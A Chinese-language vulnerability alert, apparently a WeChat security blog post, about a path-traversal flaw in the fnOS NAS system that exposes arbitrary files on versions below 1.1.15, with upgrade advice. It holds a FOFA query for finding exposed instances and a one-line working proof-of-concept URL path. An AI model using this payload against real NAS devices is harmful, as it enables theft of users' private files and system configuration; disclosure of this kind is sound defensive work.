#  【漏洞预警】国产飞牛系统 fnOS 出现安全漏洞  
PokerSec
                    PokerSec  PokerSec   2026-01-31 09:41  
  
   
  
**先关注，不迷路.**  
## 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 漏洞介绍  
  
飞牛私有云fnOS是一款基于Debian Linux内核深度开发的国产、正版免费NAS操作系统。它专为家庭和个人用户设计，提供影视库（飞牛影视）、相册、文件管理、网盘挂载等功能，支持将闲置电脑、旧笔记本或Mini主机转化为安全、高效率的私有云存储。飞牛私有云fnOS出现严重0day漏洞，可以访问nas上任意文件（包括系统配置文件，用户存储文件）。  
  
目前已知1.1.15版本已经修复该漏洞，漏洞影响范围未知（1.1.15版本以下均可能受到影响），互联网部署数量较多，请及时排查！  
## fofa  
> app="飞牛-私有云fnOS"  
  
## 影响范围  
  
1.1.15版本以下均可能受到影响  
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJIvelPj7bdEKPVhKQxEa0xbAZq58PXjt4jiatGu80PD0EpmZuO4VicL76JTiaVj4OSmRNjBXEiaaMT6XQ/640?wx_fmt=png&from=appmsg "null")  
  
  
POC:  
  
(这微信页面直接复制代码格式会乱，可以浏览器打开复制)  
```
/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJIvelPj7bdEKPVhKQxEa0xbaLqSytiagpNbXtNicOPiaCa3uI3Ho44vA4B1eCqYPRuW54R4bPWzsjq1A/640?wx_fmt=png&from=appmsg "null")  
  
  
另一个可能的rce  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJIvelPj7bdEKPVhKQxEa0xbIGWiayehN4u7GoNerxl6LoOGM8JN0cWG3YVfBySw4ib4Dl0prhic28iaOA/640?wx_fmt=png&from=appmsg "null")  
  
## 修复意见  
  
官方已知该路径穿越漏洞的情况下，不进行公告，警告/督促用户升级到最新版本:https://fnnas.com/download  
## 参考  
```
https://v2ex.com/t/1189392https://club.fnnas.com/forum.php?mod=viewthread&tid=48354
```  
  
如有侵权，请及时联系删除。  
  
   
  
  
